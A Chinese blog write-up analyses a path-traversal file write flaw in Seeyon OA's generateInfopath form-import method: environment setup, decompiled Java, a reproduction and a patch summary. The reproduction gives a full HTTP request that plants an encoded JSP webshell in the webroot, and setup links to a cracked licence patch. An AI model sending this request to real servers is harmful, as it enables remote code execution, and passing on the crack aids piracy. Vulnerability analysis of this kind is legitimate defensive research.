#  致远oa表单导入任意文件写入漏洞分析   
原创 莫大130  安全逐梦人   2024-10-12 19:34  
  
## 环境搭建  
  
- 1  
  
- 2  
  
```
链接：https://pan.baidu.com/s/1d9BgbCkV82WG1TCwXvmMDA?pwd=h7kz 
提取码：h7kz

```  
  
- （1）安装mysql数据库（针对A8版本）。创建一个新的数据库，字符集设置为UTF-8。如果是A6版本，如 A6v6.1、A6v6.1sp1、A6v6.1sp2，默认使用内嵌在安装包中的postgresql作为数据库，无需单独安装  
  
- （2）获取安装文件。Seeyonxxx.zip（安装包）、jwycbjnoyees.jar（破解补丁）  
  
- （3）在安装包中点击要安装版本.bat文件，如/inst/SeeyonA6-1Install_real.bat  
  
- （4）按照弹出的安装程序确认安装路径、配置数据库等（安装过程需要断网，否则检测到不是最新版无法进行下一步）。如果是A6版本，到数据库配置阶段可以修改postgres用户的密码。另外，针对A6版本，postgresql安装完成后不会设置Windows服务项，重启机器后再次启动会比较麻烦，可使用如下命令注册一个名为pgsql的服务项。后续可在Windows服务管理里启停postgresql服务  
  
- 1  
  
```
cd C:\Seeyon\A6V6.1SP2\pgsql9.2.5\bin pg_ctl.exe register -N "pgsql" -D "C:\Seeyon\A6\A6V6.1SP2\pgsql9.2.5\data"

```  
  
- （5）安装最后一步是账号密码设置。A6-A8.0版本默认设置system账户的密码。A8.1版本可定义管理员账号、密码、普通用户初始密码、S1 Agent密码。  
  
- （6）安装破解补丁。如果服务已经启动，需要先关闭服务。首先备份安装目录A6\ApacheJetspeed\webapps\seeyon\WEB-INF\lib下的jwycbjnoyees.jar文件，然后将其替换成补丁文件后重启服务。补丁文件下载（此补丁针对A8.1）：https://github.com/ax1sX/SecurityList/blob/main/Java_OA/jwycbjnoyees.jar  
  
- （7）服务启动。A6在确保postgresql数据库服务是启动的状态下，点击“致远服务”图标来启动服务。A8是通过agent+server的形式来部署的。所以需要先启动S1 Agent，通过双击Seeyon\A8\S1\start.bat或点击SeeyonS1Agent图标都可以实现。然后再点击“致远服务”图标（等效于/S1/client/clent.exe），在其“服务启动配置”中添加Agent。  
  
- （8）默认端口是80，可以在“致远服务”的“服务启动配置”中点击Agent的配置选项，对HTTP端口和JVM属性进行更改。想要对致远进行调试，可以在修改/ApacheJetspeed/bin/startup.bat文件，添加如下内容。  
  
- 1  
  
```
set JAVA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005"

```  
  
### 目录结构  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42LERYDBmWRwklhPFmJLODDvNteH1BGnZ48XM9V4uTILHEKb3C3BQAbQ/640?wx_fmt=png&from=appmsg "")  
  
管理员权限运行 /inst/SeeyonA6-1Install_real.bat  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42Nh39jHUrWTibiaXCxJ7icXXMSSgon7524cU3SIp6Z4RzOTsUNXO5vBA6w/640?wx_fmt=png&from=appmsg "")  
按照程序提示一步步安装即可。  
### 运行程序  
  
安装成功后的目录结构  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42nuR82jibTqYkm0pOa4gv7qFiaYKqXukEzguoyFRDh9fTH4jst07XMVYg/640?wx_fmt=png&from=appmsg "")  
  
/ApacheJetspeed/bin/startup.bat 添加调试代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42E6zfCnhAxCdPQGzL9rFeqRS7kILSfFEHD9eDLbPDI15CJnibU8KHjicQ/640?wx_fmt=png&from=appmsg "")  
  
配置debug  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42icXwdmUKP9R7sEOUSXDLtLJgOTbJVqibrpiaj0zfyUmn5qfTofUibMXS7A/640?wx_fmt=png&from=appmsg "")  
  
测试调试下断点  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42op0kKllSfISjQ9JvqnicMQ0VTbBKwOHf28XeA9DFwlqe63gdMTWFVicQ/640?wx_fmt=png&from=appmsg "")  
## generateInfopath 函数  
  
漏洞文件：\ApacheJetspeed\webapps\seeyon\WEB-INF\lib\seeyon-cap-core\com\seeyon\cap4\form\modules\engin\design\impl\CAP4FormDesignManagerImpl.java  
  
- 1  
  
- 2  
  
- 3  
  
- 4  
  
- 5  
  
- 6  
  
- 7  
  
- 8  
  
- 9  
  
- 10  
  
- 11  
  
- 12  
  
- 13  
  
- 14  
  
- 15  
  
- 16  
  
- 17  
  
- 18  
  
- 19  
  
- 20  
  
- 21  
  
- 22  
  
- 23  
  
- 24  
  
- 25  
  
- 26  
  
- 27  
  
- 28  
  
- 29  
  
- 30  
  
- 31  
  
- 32  
  
- 33  
  
- 34  
  
- 35  
  
- 36  
  
- 37  
  
- 38  
  
- 39  
  
- 40  
  
- 41  
  
- 42  
  
- 43  
  
- 44  
  
- 45  
  
- 46  
  
- 47  
  
- 48  
  
- 49  
  
- 50  
  
- 51  
  
- 52  
  
- 53  
  
- 54  
  
- 55  
  
- 56  
  
- 57  
  
- 58  
  
- 59  
  
- 60  
  
- 61  
  
- 62  
  
- 63  
  
- 64  
  
- 65  
  
- 66  
  
- 67  
  
- 68  
  
- 69  
  
- 70  
  
- 71  
  
- 72  
  
```
@Override  
@AjaxAccess  
@CheckRoleAccess(resourceCode={"govdoc_manage"}, roleTypes={OrgConstants.Role_NAME.EdocManagement, OrgConstants.Role_NAME.FormAdmin})  
public Map<String, Object> generateInfopath(Map<String, Object> params) throws BusinessException {  
    List atts;  
    String zipName;  
    String paramName = "files";  
    if (!params.containsKey(paramName)) {  
        throw new BusinessException("没有传入表单视图内容文件，请传入视图内容文件！");  
    }  
    HashMap<String, Object> resultMap = new HashMap<String, Object>();  
    Date date = new Date();  
    String fileId = String.valueOf(date.getTime());  
    String baseFolder = this.fileManager.getNowFolder(true);  
    Long subFolder = UUIDLong.absLongUUID();  
    String rootPath = baseFolder + File.separator + String.valueOf(subFolder) + File.separator;  
    List files = (List)params.get("files");  
    if (null != files && files.size() > 0) {  
        for (Map map : files) {  
            String fileName = (String)map.get("fileName");  
            String fileContent = (String)map.get("fileContent");  
            CapUtil.writeFile((String)rootPath, (String)fileName, (String)fileContent);  
        }  
    }  
    if (Strings.isNotEmpty((String)(zipName = String.valueOf(params.get("name"))))) {  
        zipName = zipName + ".zip";  
    }  
    if (null != (atts = (List)params.get("atts")) && atts.size() > 0) {  
        CtpLocalFile attFile = new CtpLocalFile(rootPath + "attachment" + File.separator);  
        if (!attFile.exists()) {  
            attFile.mkdirs();  
        }  
        try {  
            for (Map map : atts) {  
                Long imgFileId;  
                CtpFile file;  
                String fileUrl = (String)map.get("fileUrl");  
                String createDate = (String)map.get("createDate");  
                String attachmentName = (String)map.get("name");  
                if (Strings.isEmpty((String)attachmentName)) {  
                    attachmentName = UUIDLong.absLongUUID() + "";  
                }  
                if (null == (file = this.fileManager.getFile(imgFileId = Long.valueOf(Long.parseLong(fileUrl)), DateUtil.parse((String)createDate, (String)"yyyy-MM-dd"))) || !file.exists()) continue;  
                CtpFile destination = new CtpFile(rootPath + attachmentName);  
                if (!destination.exists()) {  
                    destination.createNewFile();  
                }  
                GlobalFileUtils.copyCtpFile((CtpFile)file, (CtpFile)destination);  
                LOGGER.info((Object)("\u9644\u4ef6(id:" + fileUrl + " createDate:" + createDate + ") \u4e0d\u5b58\u5728\uff0c\u65e0\u6cd5\u62f7\u8d1d\uff01"));  
            }  
        }  
        catch (Exception e) {  
            LOGGER.error((Object)e.getMessage(), (Throwable)e);  
        }  
    }  
    CtpLocalFile rootFile = new CtpLocalFile(rootPath);  
    String toFileName = rootFile.getParent() + File.separator + fileId;  
    CtpLocalFile toFile = new CtpLocalFile(toFileName);  
    try {  
        ZipUtil.zip((CtpLocalFile)rootFile, (CtpAbstractFile)toFile, (boolean)false);  
        V3XFile v3XFile = this.fileManager.save((CtpAbstractFile)toFile, ApplicationCategoryEnum.global, zipName, DateUtil.currentDate(), Boolean.valueOf(true));  
        resultMap.put("fileId", v3XFile.getId());  
        resultMap.put("createDate", v3XFile.getCreateDate());  
    }  
    catch (Exception e) {  
        LOGGER.error((Object)e.getMessage(), (Throwable)e);  
    }  
    finally {  
        FileUtil.deleteFile((CtpLocalFile)rootFile);  
    }  
    return resultMap;  
}

```  
  
  
主要实现写入文件的方法 CapUtil.writeFile((String)rootPath, (String)fileName, (String)fileContent);  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42Znz6ESqWCOIeoLlfIuEFkxY84dNGjdUPDD0kWrJLBENJ03O0vZKXibA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42Pdibd1micqhwY1Pv7FTA2Fer8pmVRciaLScriaud94E59fJibFyUMRjY3OA/640?wx_fmt=png&from=appmsg "")  
  
跟着进去writeFile 方法  
## CapUtil.writeFile  
  
文件路径：\ApacheJetspeed\webapps\seeyon\WEB-INF\lib\seeyon-cap-api.jar!\com\seeyon\cap4\form\util\CapUtil.class  
  
- 1  
  
- 2  
  
- 3  
  
- 4  
  
- 5  
  
- 6  
  
- 7  
  
- 8  
  
- 9  
  
- 10  
  
- 11  
  
- 12  
  
- 13  
  
- 14  
  
- 15  
  
- 16  
  
- 17  
  
- 18  
  
- 19  
  
- 20  
  
- 21  
  
- 22  
  
- 23  
  
- 24  
  
- 25  
  
- 26  
  
- 27  
  
```
public static void writeFile(String baseDir, String fileExt, String content) throws BusinessException {  
    CtpLocalFile file = new CtpLocalFile(baseDir);  
    if (!file.exists()) {  
        file.mkdirs();  
    }  
  
    CtpLocalFile destFile = new CtpLocalFile(baseDir, fileExt);  
    OutputStream fout = null;  
    PrintStream writer = null;  
  
    try {  
        fout = new FileOutputStream(destFile);  
        writer = new PrintStream(fout, false, "UTF-8");  
        writer.print(content);  
        writer.flush();  
    } catch (FileNotFoundException var12) {  
        logger.error(var12.getMessage(), var12);  
        throw new BusinessException("写入文件异常，未找到文件：" + var12.getMessage(), var12);  
    } catch (UnsupportedEncodingException var13) {  
        logger.error(var13.getMessage(), var13);  
        throw new BusinessException("写入文件异常，不支持的编码：" + var13.getMessage(), var13);  
    } finally {  
        IOUtils.closeQuietly(writer);  
        IOUtils.closeQuietly(fout);  
    }  
  
}

```  
  
  
CtpLocalFile file = new CtpLocalFile(baseDir);  创建一个目录的对象，并 if 判断 file 目录是否存在，不存在就创建新文件夹。CtpLocalFile destFile = new CtpLocalFile(baseDir, fileExt);  创建文件对象  
  
- 1  
  
- 2  
  
- 3  
  
- 4  
  
```
fout = new FileOutputStream(destFile);  
writer = new PrintStream(fout, false, "UTF-8");  
writer.print(content);  
writer.flush();

```  
  
  
创建一个文件输出流 fout，用于向目标文件写入数据。创建一个 PrintStream 对象 writer，指定输出流和字符编码为 UTF-8。使用 writer.print(content) 将内容写入文件，并使用 writer.flush() 确保所有内容都被写入。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42mBbfBX8dXd1UI6TzYKEpqTet4zOsNBsibrNrwZuEsbVJ8SWxe8Znl7A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42UpeqksczwdlvciaNibQvj9rg2dCCjSwhk7YecmVtpLfqLJXXSByh9Wag/640?wx_fmt=png&from=appmsg "")  
  
成功写入文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42gF1WibDG2bttqiaRWFb3gBc1Z1XtHvlJqicUXSo286OHaibdxCGlas328A/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
  
- 1  
  
- 2  
  
- 3  
  
- 4  
  
- 5  
  
- 6  
  
- 7  
  
- 8  
  
- 9  
  
- 10  
  
- 11  
  
- 12  
  
- 13  
  
```
POST /seeyon/ajax.do?method=ajaxAction&managerName=cap4FormDesignManager HTTP/1.1
Accept: */*Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: keep-aliveContent-Length: 331Content-Type: application/x-www-form-urlencoded;charset=UTF-8Cookie: ts=1728653264995; JSESSIONID=EADD9E1D7E239870F85E73935AC9AD34; loginPageURL=; login_locale=zh_CN; avatarImageUrl=5995465946958220283Host: 192.168.18.129:8085RequestType: AJAXUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0managerMethod=generateInfopath&arguments={"files":[{"fileName":"../../../../../../ApacheJetspeed/webapps/seeyon/5.jsp","fileContent":"%3c%25%6f%75%74%2e%70%72%69%6e%74%28%6f%72%67%2e%61%70%61%63%68%65%2e%6a%61%73%70%65%72%2e%72%75%6e%74%69%6d%65%2e%50%61%67%65%43%6f%6e%74%65%78%74%49%6d%70%6c%2e%70%72%6f%70%72%69%65%74%61%72%79%45%76%61%6c%75%61%74%65%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%5c%22%63%6f%64%65%5c%22%29%2c%20%53%74%72%69%6e%67%2e%63%6c%61%73%73%2c%20%70%61%67%65%43%6f%6e%74%65%78%74%2c%20%6e%75%6c%6c%29%29%3b%25%3e"}]}

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42eymCp7873ODhrlw2cynTBDXepPW3ia2iaYXSgdjZeTGLyLCOkZnfXEHw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42zUNt2icgZMCvn6d7rePP6ltyrkGbzqdyjyxS6g9gjmaSjzl7GqqBL4w/640?wx_fmt=png&from=appmsg "")  
## 补丁  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42icVM4eDl0HtR0l3Orev9jXzwsYsv8riaE6Ipdicm8eY6A00vAP6NgYZjw/640?wx_fmt=png&from=appmsg "")  
  
对传入的路径和文件后缀进行过滤  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42tsxgiczaGicho93D26cMic7G3zXC1uaLrcP80iaoaUA5Ug9ibgibDshjRt8g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42KsuUUbVVnEwYHO9Qticg7fYyhUvZxISN1blbBkibKVia6ocjM7c0DZHSA/640?wx_fmt=png&from=appmsg "")  
## 参考文章  
- https://github.com/ax1sX/SecurityList/blob/main/Java_OA/SeeyonAudit.md  
  
- https://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=178  
  
> 附上微信群，交流技术和划水聊天等，扫描下面二维码，添加我好友拉进群。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vOGOib9z4Wz4ARKnFCvdhC4HnKgs5Gx42JiczvjWzCaeegTnhEIVZu7HEsXP4G5aH6GoarW077cYNaRrVxXRkFYw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
